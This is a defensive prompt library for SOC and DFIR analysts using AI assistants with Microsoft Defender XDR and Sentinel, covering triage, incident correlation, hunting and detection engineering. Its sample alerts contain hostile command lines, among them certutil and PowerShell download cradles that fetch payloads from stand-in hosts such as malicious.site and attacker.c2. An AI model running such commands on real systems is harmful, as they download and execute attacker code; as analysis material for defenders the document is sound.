# Security OPerations Prompt Library

### Introduction

This library supports operationalising AI as an analyst, investigation assistant, and threat-hunting co-pilot in enterprise environments (cloud, hybrid, on-prem). Focus areas include Windows endpoints/servers, Entra ID, MDE, and hybrid deployments.&#x20;

Prompts enforce discipline to minimise hallucinations: base conclusions on evidence, separate facts from assumptions, highlight uncertainties, and recommend next steps.

The following are concrete, copy-paste-ready prompt examples for cybersecurity defenders to utilise as a starting point. Each example is written as a full, standalone prompt that an analyst can directly use with an AI assistant (e.g., Grok, Copilot, ChatGPT, Claude) during real investigations.

### 1. Foundational Prompt Structure (Base Template)

{% code overflow="wrap" %}
```bash
You are a senior DFIR and SOC analyst.

Context:
- Environment: Hybrid (Entra ID + on-prem AD)
- Platform(s): Microsoft Defender XDR, Microsoft Sentinel
- Time window: 2026-01-15 00:00 – 2026-01-20 18:00 UTC
- Scope: Europe tenant, devices tagged "Finance" and "Domain Controllers"

Objective:
- Full investigation of suspected credential compromise and lateral movement

Data Provided:
- Defender XDR alert JSON: [paste full alert JSON here]
- Advanced Hunting KQL results (DeviceProcessEvents, DeviceLogonEvents): [paste output]
- Entra ID sign-in log excerpt for user svc-finance@company.com
- Suspicious process tree screenshot/text export

Constraints:
- Enterprise Windows 10/11 & Server 2022 environment
- Map all activity to MITRE ATT&CK (include sub-techniques where possible)
- Evidence-based only — clearly label assumptions
- State confidence level (High / Medium / Low) for each major conclusion

Output Required:
- Executive Summary (3–5 sentences)
- Detailed Findings & Timeline
- MITRE ATT&CK Mapping table
- Indicators of Compromise (IOCs)
- Likely attacker objectives & current stage
- Recommended immediate & medium-term actions
- Follow-up queries/artefacts to collect
```
{% endcode %}

### 2. Core SOC Prompt Categories

#### 2.1 SOC Alert Triage

{% code overflow="wrap" %}
```bash
You are a Tier-1 SOC analyst using Microsoft Defender XDR.

Analyse the following Defender alert:

Alert Title: Suspicious rundll32 execution from an unusual location
Category: Defence Evasion
Severity: High
MITRE Technique (auto-tagged): T1218.011 – Rundll32
Timestamp: 2026-01-19 15:47 UTC
Affected Device: WORKSTATION-FIN-112
Affected User: finance-user@company.com
File: C:\Users\finance-user\AppData\Local\Temp\run.dll
Command line: rundll32.exe C:\Users\finance-user\AppData\Local\Temp\run.dll,#1
Parent process: explorer.exe

Tasks:
- Validate alert legitimacy (true positive vs possible FP)
- Identify affected user, device, process chain
- Determine if activity appears benign, suspicious, or malicious
- Map behaviour to MITRE ATT&CK (tactic + technique + sub-technique if applicable)
- Recommend immediate next action: escalate / close / investigate further / isolate
```
{% endcode %}

#### 2.2 Incident Correlation

```bash
You are a Tier-2 SOC analyst correlating a Sentinel incident.

Incident ID: INC-20260119-4782
Severity: High
Analytics Rules Triggered:
  • Abnormal sign-in – impossible travel (Entra ID)
  • Suspicious PowerShell execution (Defender XDR)
  • NTLM authentication from new device (SecurityEvent)

Entities Involved:
  • User: admin-service@company.com
  • Devices: DC-LON-03, WORKSTATION-456
  • IPs: 185.220.101.12 (exit node), internal 10.10.20.45

Time window: 2026-01-18 23:00 – 2026-01-19 05:00 UTC

Tasks:
- Build a single coherent attack narrative/timeline
- Identify the most likely initial access vector
- Confirm evidence of lateral movement
- Highlight visibility gaps (missing logs/sources)
- Suggest 3–5 priority KQL queries or Advanced Hunting actions to validate the story
```

#### 2.3 DFIR Investigation

{% code overflow="wrap" %}
```bash
You are conducting a DFIR investigation on a compromised Windows server.

Evidence available:
- Sysmon log export (Event ID 1,3,13) – process creations & network connections
- Defender XDR DeviceTimeline export (JSON/CSV)
- Volatility 3 output: pslist, netscan, cmdline, malfind
- Suspicious process: svchost.exe (PID 1984) – command line: svchost.exe -k netsvcs -p -s hidserv
- Parent: services.exe
- Network: outbound connections to 45.32.123.45:443 & 185.220.101.8:80

Objective:
- Reconstruct timeline of malicious activity
- Identify persistence, execution, credential access, and lateral movement
- Assess whether this is isolated or part of a broader compromise

Output:
- Chronological timeline (use table format)
- MITRE ATT&CK mapping (tactic → technique → sub-technique)
- Confidence level per finding
- Critical artefacts still needed (e.g., full memory dump, registry hives)
```
{% endcode %}

#### 2.4 Threat Hunting (Hypothesis-Driven)

{% code overflow="wrap" %}
```bash
You are a proactive threat hunter in a Defender XDR + Sentinel environment.

Hypothesis:
"An attacker with valid credentials is performing living-off-the-land reconnaissance and lateral movement using native Windows binaries (certutil, bitsadmin, net.exe, whoami, etc.)."

Environment: Windows 10/11 endpoints + Server 2022, full MDE coverage

Tasks:
- List the most relevant MITRE ATT&CK techniques (Tactic + Technique ID + Name)
- Write 3–4 targeted KQL hunting queries (DeviceProcessEvents, DeviceNetworkEvents)
- Explain expected benign patterns / false positives for each query
- Define clear success criteria for the hunt (what confirms/refutes the hypothesis)
- Suggest 2–3 hardening or detection tuning recommendations
```
{% endcode %}

#### 2.5 Log Analysis and Query Generation

{% code overflow="wrap" %}
```bash
You are a detection engineer refining KQL for Microsoft Sentinel / Defender XDR.

Objective:
"Detect credential dumping activity involving lsass.exe access or suspicious process-memory interaction (procdump, mimikatz-style patterns, comsvcs.dll minidump)"

Tasks:
- Write a production-ready, efficient KQL query using DeviceProcessEvents and/or DeviceFileEvents
- Include realistic exclusions to reduce FPs (known backup tools, admin scripts)
- Explain each major clause / join / filter
- Suggest severity, entity mapping, and tuning advice for analytics rule
```
{% endcode %}

#### 2.6 Incident Response & Containment Strategy

```bash
You are the incident commander advising on containment.

Current situation (2026-01-20 18:00 UTC):
- Confirmed: Entra ID account compromise (svc-finance@company.com)
- Confirmed: Credential material stolen (NT hash suspected)
- Evidence: Lateral movement attempt to DC-LON-03 via WMI / PsExec
- No confirmed data exfiltration or ransomware deployment yet
- Business impact: Finance quarter-end processing in progress

Tasks:
- Recommend immediate containment actions (prioritised list)
- Flag any actions that would destroy critical evidence
- Propose phased containment → eradication → recovery plan
- Highlight key business & legal considerations
```

#### 2.7 Executive and Reporting

{% code overflow="wrap" %}
```bash
You are drafting an executive summary for senior leadership.

Incident: Suspected initial access → credential theft → lateral movement attempt
Timeline: Detected 2026-01-19 14:00 UTC, containment actions started 2026-01-20 09:00 UTC
Status: Active incident, no confirmed data loss or ransomware

Audience: CISO, Legal, CEO, Board

Tasks:
- Summarise the incident in plain English (max 250 words)
- Explain attacker goals and current believed impact
- Clearly separate what is CONFIRMED vs SUSPECTED vs UNKNOWN
- List top 3 business risks right now
- Provide 4–5 forward-looking recommendations (technical + non-technical)
```
{% endcode %}

### 3. Microsoft Defender XDR-Specific Prompt Pack

#### 3.1 Alert Deep Analysis Example

{% code overflow="wrap" %}
```bash
You are performing a deep analysis of a Microsoft Defender XDR alert.

Alert Details:
- Title: Suspicious use of certutil.exe for download
- Category: CommandAndControl
- Severity: Medium
- MITRE: T1105 – Ingress Tool Transfer
- Device: WORKSTATION-DEV-088
- File: certutil.exe -urlfetch -f https://malicious.site/payload.exe C:\temp\update.exe
- Timestamp: 2026-01-19 16:22 UTC

Tasks:
- Validate whether the alert logic holds up against surrounding telemetry
- Identify root cause/user or process that triggered execution
- Determine if compromise is isolated or part of wa ider campaign
- Recommend Defender automated/manual response actions (isolate device? run AV scan? collect investigation package?)
```
{% endcode %}

### 4. Microsoft Sentinel-Specific Prompt Pack

#### 4.1 Incident Investigation

{% code overflow="wrap" %}
```bash
You are investigating a Microsoft Sentinel incident.

Incident Details:
- Incident ID: INC-20260120-8921
- Severity: Critical
- Analytics Rules Triggered: Entra ID Risky Sign-in, Defender XDR Suspicious Process Creation, Azure Activity Resource Creation
- Entities Involved: User: cloud-admin@company.com, Device: VM-AZURE-DEV-001, IP: 104.248.178.12 (known TOR exit), Resource: Storage Account "financedata2026"

Time window: 2026-01-19 20:00 – 2026-01-20 06:00 UTC

Tasks:
- Validate the accuracy of triggered analytics rules
- Correlate all alerts into a single, logical attack narrative
- Identify probable root cause (e.g., phishing, supply chain)
- Assess containment urgency (e.g., immediate isolation needed?)
- Suggest 2–3 Sentinel workbooks or KQL queries for deeper validation
```
{% endcode %}

#### 4.2 KQL Analytics Rule Review / Detection Engineering

{% code overflow="wrap" %}
```bash
You are a detection engineer reviewing and improving a Sentinel analytics rule.

Current Rule Logic (KQL):
SecurityEvent
| where EventID == 4624
| where LogonType == 3
| where IpAddress !in ("127.0.0.1", "::1")
| summarize count() by IpAddress, Account
| where count_ > 5
| extend severity = "Medium"

Objective:
- Enhance detection for lateral movement via NTLM authentication abuse

Tasks:
- Identify gaps in current logic (e.g., missing filters for known scanners)
- Reduce false positives with better exclusions (e.g., admin IPs, service accounts)
- Improve coverage to include related events (e.g., join with DeviceLogonEvents)
- Align detection to MITRE ATT&CK (e.g., T1078.003)
- Suggest updated alert severity, entity mapping, and query frequency
```
{% endcode %}

#### 4.3 Cross-Workspace Correlation

{% code overflow="wrap" %}
```bash
You are correlating activity across Sentinel workspaces.

Data Sources Involved:
- Entra ID Sign-in Logs: Abnormal sign-in for user devops@company.com from IP 45.79.192.XXX
- SecurityEvent: Logon attempts on on-prem DC-LON-02
- Defender XDR: DeviceNetworkEvents showing outbound to Azure Storage
- AzureActivity: New role assignment to storage account "backupdata2026"

Time window: 2026-01-19 22:00 – 2026-01-20 04:00 UTC

Tasks:
- Identify full identity-to-endpoint-to-cloud attack chain
- Detect any cross-platform behaviour (e.g., hybrid identity abuse)
- Highlight timeline inconsistencies or anomalies (e.g., time zone mismatches)
- Propose KQL query to unify these sources for future automation
- Recommend enrichment (e.g., GeoIP lookup, threat intel integration)
```
{% endcode %}

#### 4.4 Threat Hunting

{% code overflow="wrap" %}
```bash
You are performing hypothesis-driven threat hunting in Microsoft Sentinel.

Hypothesis:
"A compromised cloud identity (Entra ID) is being used to access on-prem resources via hybrid join, potentially for data exfiltration."

Environment: Sentinel with connectors for Entra ID, Defender XDR, Azure Activity, SecurityEvent

Tasks:
- Identify the most relevant Sentinel tables (e.g., SigninLogs, AzureActivity)
- Write 3–4 targeted KQL hunting queries (include joins where needed)
- Describe expected benign patterns (e.g., scheduled syncs) to filter out
- Define escalation criteria (e.g., if >5 anomalous accesses in 1h, alert Tier-2)
- Suggest MITRE ATT&CK mapping for findings (e.g., TA0008 Lateral Movement)
```
{% endcode %}

#### 4.5 Automation & SOAR Review

{% code overflow="wrap" %}
```bash
You are assessing Sentinel automation and SOAR effectiveness.

Playbooks Involved:
- Playbook 1: "Auto-Isolate on High Severity" – Triggers on Defender XDR alerts, isolates device via API
- Playbook 2: "Entra ID Risk Response" – Revokes sessions on risky sign-ins
- Playbook 3: "Data Exfil Alert" – Blocks IP on Azure Firewall for suspicious AzureActivity

Incident Context: Recent incident INC-20260119-4782 with 15-minute response delay

Tasks:
- Identify potential delays in playbook execution (e.g., API rate limits)
- Recommend improvements (e.g., add parallel branches, better error handling)
- Highlight risks of over-automation (e.g., false positives causing outages)
- Suggest metrics for playbook efficacy (e.g., MTTR reduction, FP rate)
```
{% endcode %}

### 5. Junior Analyst AI Playbooks

#### 5.1 Alert Handling Playbook

{% code overflow="wrap" %}
```bash
You are guiding a junior SOC analyst through alert handling.

Trigger: New Defender XDR alert
Alert Details:
- Title: Suspicious mshta.exe execution
- Severity: High
- MITRE: T1218.005 – Mshta
- Command line: mshta.exe javascript:"Close(<script>alert('test')</script>)"
- Device: WORKSTATION-HR-789
- Timestamp: 2026-01-20 10:15 UTC

Goal: Decide if close vs escalate

Explain step-by-step:
- What this alert means in simple terms
- Why it triggered (detection logic)
- What normal/benign mshta.exe behaviour looks like (e.g., legacy apps)
- What specifically makes this instance suspicious (e.g., JavaScript payload)
- Recommendation: Escalate? Close as FP? Why? Next steps if escalated
```
{% endcode %}

#### 5.2 “What Should I Check Next?” Playbook&#x20;

{% code overflow="wrap" %}
```bash
You are mentoring a junior analyst on investigative progression.

Current findings:
- Entra ID: Risky sign-in flagged for user hr-manager@company.com (new device, unusual location)
- Defender XDR: Shortly after, PowerShell process spawned on linked device HR-LAPTOP-22 with command: Invoke-WebRequest -Uri "http://shady.site/script.ps1" -OutFile "C:\temp\script.ps1"
- No confirmed execution of the downloaded script yet
- Time: 2026-01-20 14:30 UTC

Tasks:
- Identify key missing context (e.g., user confirmation, network logs)
- Suggest the next 3 specific investigation steps (e.g., run KQL query X)
- Explain why each step matters and what it could reveal
- Highlight 2–3 common junior mistakes to avoid (e.g., assuming FP without evidence)
```
{% endcode %}

#### 5.3 False Positive Validation Playbook

{% code overflow="wrap" %}
```bash
You are helping a junior analyst validate a suspected false positive.

Suspected FP Alert:
- Sentinel Analytics Rule: "High Volume of Failed Logons"
- Details: 12 failed logons (EventID 4625) for service account svc-backup@company.com from IP 10.10.50.10
- Time window: 2026-01-20 02:00 – 03:00 UTC
- Potential benign cause: Scheduled backup job with temp credential issue

Tasks:
- List 3–4 possible benign explanations with evidence needed to confirm
- Determine what specific evidence is required for safe closure (e.g., correlate with AzureActivity)
- Recommend standard documentation language for the ticket (e.g., "Closed as FP due to...")
- Suggest rule tuning improvements to prevent similar FPs (e.g., exclude service accounts)
```
{% endcode %}

6\. MITRE ATT\&CK–Aligned Prompt Examples

6.1 Technique-Specific (T1059 – Command & Scripting Interpreter)

{% code overflow="wrap" %}
```bash
You are analysing activity aligned to MITRE ATT&CK T1059 (Command and Scripting Interpreter).

Data Provided:
- DeviceProcessEvents: powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.c2/ps1')"
- Parent process: cmd.exe (spawned from explorer.exe)
- Timestamp: 2026-01-20 11:45 UTC
- Device: DEV-WORKSTATION-334

Tasks:
- Identify suspicious command-line patterns (e.g., encoded commands, web downloads)
- Compare to known attacker tradecraft (e.g., Empire, Cobalt Strike usage)
- Map sub-techniques (e.g., T1059.001 PowerShell)
- Recommend detection improvements (e.g., KQL for webclient patterns, ASR rules)
- Suggest containment if confirmed malicious
```
{% endcode %}

#### 6.2 Tactic-Driven (Lateral Movement)

{% code overflow="wrap" %}
```bash
You are investigating potential lateral movement activity (MITRE TA0008).

Data Provided:
- SecurityEvent: EventID 4624 (Logon Type 3 - Network) from WORKSTATION-123 to DC-PAR-05 for user domain-admin@company.com
- DeviceNetworkEvents: SMB traffic (port 445) with file share access attempts
- Followed by: wmic.exe /node:FILESRV-67 process call create "net use Z: \\share\data"
- IP: Internal 10.20.30.40
- Time window: 2026-01-20 13:00 – 14:00 UTC

Tasks:
- Identify signs of authentication abuse or remote service execution
- Detect specific techniques (e.g., T1021.002 SMB/Windows Admin Shares, T1570 Lateral Tool Transfer)
- Map full activity to MITRE tactics/techniques/sub-techniques
- Recommend immediate containment controls (e.g., disable NTLM, restrict WMI)
- Propose hunting queries to check for similar activity domain-wide
```
{% endcode %}
